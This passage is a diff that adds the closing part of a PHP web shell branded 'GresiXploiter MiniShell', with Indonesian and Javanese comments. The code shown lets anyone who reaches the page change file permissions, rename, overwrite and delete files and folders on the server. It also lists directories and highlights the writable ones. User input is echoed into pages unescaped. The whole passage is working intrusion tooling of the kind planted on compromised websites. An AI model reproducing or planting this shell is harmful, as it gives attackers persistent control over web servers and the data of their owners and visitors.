+                                    }
+                                }
+                                echo "<form method=POST><font class=\"titulo\">Permission:~$&nbsp;</font><input type=\"text\" name=\"perm\" style=\"color:white;\" size=\"4\" value='".substr(sprintf('%o', fileperms($_POST['path'])), -4)."'><input type=\"hidden\" name=\"path\" value='".$_POST['path']."'><input type=\"hidden\" name=\"opt\" value=\"chmod\"><input type=\"submit\" class=\"submit\" value=\">>\"></form>";
+                                
+
+
+
+                                // Iki kanggo ganti nama =============================00000000000
+                            }elseif($_POST['opt'] == 'rename'){
+                                if(isset($_POST['newname'])){
+                                    if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+                                        echo "<script>swal ('Done Lurd !', 'Nama File Berhasil Di Ubah !', 'success')</script><font color=lime>Nama File Di Ubah !</font><br>";
+                                    }else{
+                                        echo "<font color=red>Nama File Tidak Dapat DiHapus !</font>";
+                                    }//namae
+                                    $_POST['name'] = $_POST['newname'];
+                                }//namae
+                                echo "<form method=POST><font class=\"titulo\">New Name:~$&nbsp;</font><input name= \"newname\" type=\"text\" style=\"color:white;\" size=\"20\" value='".sanitize($_POST['name'])."'><input type=\"hidden\" name=\"path\" value='".sanitize($_POST['path'])."'><input type=\"hidden\" name=\"opt\" value=\"rename\"><input type=\"submit\" class=\"submit\" value=\">>\"></form>";
+                                
+
+
+
+
+                                // Iki kanggo edit file ===================0000000000000
+                            }elseif($_POST['opt'] == 'edit'){
+                                if(isset($_POST['source'])){
+                                    $fopen = fopen($_POST['path'], 'w');
+                                    if(fwrite($fopen, $_POST['source'])){
+                                        echo "<script>swal ('Done Lurd !', 'File Berhasil Di Edit !', 'success')</script><font color=lime>File Di Edit !</font><br>";
+                                    }else{
+                                        echo "<font color=red>File Gagal Di Hapus !</font><br>";
+                                    }
+                                    fclose($fopen);
+                                }
+                                echo "<form method=POST><textarea cols=80 rows=20 name=\"source\">".sanitize(file_get_contents($_POST['path']))."</textarea><br><input type=\"hidden\" name=\"path\" value='".sanitize($_POST['path'])."'><input type=\"hidden\" name=\"opt\" value=\"edit\"><input type=\"submit\" class=\"submit\" value=\"Edit\"></form>";
+                            }
+                            echo "</center>";
+                            
+
+
+
+                            // Iki hapus folder ===========================00000000000000
+                        }else{
+                            echo "</table><br></center>";
+                            if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+                                if($_POST['type'] == 'dir'){
+                                    if(rmdir($_POST['path'])){
+                                        echo "<script>swal ('Done Lurd !', 'Folder Berhasil Di Hapus !', 'success')</script><font color=lime>Folder Terhapus !</font><br>";
+                                    }else{
+                                        echo "<font color=red>Folder Gagal Di Hapus !</font><br>";
+                                    }//rmdir
+                                }elseif($_POST['type'] == 'file'){
+                                    if(unlink($_POST['path'])){
+                                        echo "<script>swal ('Done Lurd !', 'File Berhasil DiHapus !', 'success')</script><font color=lime>File Terhapus !</font><br>";
+                                    }else{
+                                        echo "<font color=red>File Di Hapus!</font><br>";
+                                    }
+                                }
+                            }
+                            echo "</center>";
+                            $scandir = scandir($path);
+                            
+
+
+
+
+                            // Label e boss ==============================00000000000000
+                            echo "
+                            <hr width='80%'><div class=\"content\" id=\"details\">
+                                <table class=\"lamesa\" cellpadding=\"3\" cellspacing=\"1\">
+                                    <tr>
+                                        <th><font class=\"titulo\"><i class='fa fa-folder' style='color:white;'></i> Nama</font></th>
+                                        <th><font class=\"titulo\"><i class='fa fa-database' style='color:white;'></i> Ukuran File</font></th>
+                                        <th><font class=\"titulo\"><i class='fa fa-cogs' style='color:white;'></i> Permissions</font></th>
+                                        <th><font class=\"titulo\"><i class='fa fa-edit' style='color:white;'></i> Opsi</font></th>
+                                    </tr>";
+                                        foreach($scandir as $dir){
+                                            if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
+                                            echo "
+                                            <tr>
+                                                <td><i class='fa fa-folder-open'></i>  <a href=\"?path=".$path."/".$dir."\">".$dir."</a></td>
+                                                <td><center>~</center></td>
+                                                <td><center>";
+                                                    if(is_writable($path.'/'.$dir)) echo "<font color=lime>";
+                                                    elseif(!is_readable($path.'/'.$dir)) echo "<font color=red>";
+                                                        echo perms($path.'/'.$dir);
+                                                    if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo "</font>";
+                                                echo "</center></td>
+                                                <td><center>
+                                                    <form method=POST action=\"?option&path=".$path."\">
+                                                        <select name=\"opt\">
+                                                            <option value=\"\"></option>
+                                                            <option value=\"delete\">Delete</option>
+                                                            <option value=\"chmod\">Chmod</option>
+                                                            <option value=\"rename\">Rename</option>
+                                                        </select>
+                                                        <input type=\"hidden\" name=\"type\" value=\"dir\">
+                                                        <input type=\"hidden\" name=\"name\" value='".$dir.">
+                                                        <input type=\"hidden\" name=\"path\" value='".$path."/".$dir.">
+                                                        <input type=\"submit\" class=\"submit\" value=\">>\">
+                                                    </form>
+                                                </center></td>
+                                            </tr>";
+                                        }
+
+                                    echo "
+                                    <tr>
+                                        <td>----------------</td><td>----------------</td><td>----------------</td><td>----------------</td>
+                                    </tr>";
+                                        
+
+
+
+
+                                        // Ukuran file e bosss ===========================00000000000
+                                        foreach($scandir as $file){
+                                            if(!is_file($path.'/'.$file)) continue;
+                                                $size = filesize($path.'/'.$file)/1024;
+                                                $size = round($size,3);
+                                                if($size >= 1024){
+                                                    $size = round($size/1024,2).' MB';
+                                                }else{
+                                                    $size = $size.' KB';
+                                                }//ukurannnnnn
+                                                echo "
+                                                <tr>
+                                                    <td><a href=\"?filesource=".$path."/".$file."&path=".$path."\">".$file."</a></td>
+                                                    <td><center>".$size."</center></td>
+                                                    <td><center>"; 
+                                                        if(is_writable($path.'/'.$file)) echo "<font color=lime>";// iso di edit
+                                                        elseif(!is_readable($path.'/'.$file)) echo "<font color=red>";// gasio diedit
+                                                            echo perms($path.'/'.$file);
+                                                        if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo "</font>";
+                                                        
+
+
+
+
+                                                        // Pilihan e ==========================00000000000
+                                                                echo "</center></td>
+                                                                <td><center>
+                                                                    <form method=POST action=\"?option&path=".$path."\">
+                                                                        <select name=\"opt\">
+                                                                            <option value=\"\"></option>
+                                                                            <option value=\"edit\">Edit</option>
+                                                                            <option value=\"delete\">Hapus</option>
+                                                                            <option value=\"chmod\">Chmod</option>
+                                                                            <option value=\"rename\">Ganti Nama</option>
+                                                                        </select>
+                                                                        <input type=\"hidden\" name=\"type\" value=\"file\">
+                                                                        <input type=\"hidden\" name=\"name\" value='".$file."'>
+                                                                        <input type=\"hidden\" name=\"path\" value='".$path."/".$file."'>
+                                                                        <input type=\"submit\" class=\"submit\" value=\"GO\">
+                                                                    </form>
+                                                                </center></td>
+                                                            </tr>";
+                                        }
+                                    echo "
+                                </table>
+                            </div>";
+                        }
+                        // Kopirekkkkk :v
+                    echo "
+                </table>
+ 
+                
+                <div class='foot'>
+                    <hr width='80%'>
+                    <footer><font color=lime class=titulo>GresiXploiter MiniShell</font> &copy;  2019</footer>
+                </div>
+            </body>
+        </html>";
+function perms($file){
+$perms = fileperms($file);
+if (($perms & 0xC000) == 0xC000) {
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+$info = 'p';
+} else {
+
+$info = 'u';
+}
+
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+ 
+return $info;
+}
+?>
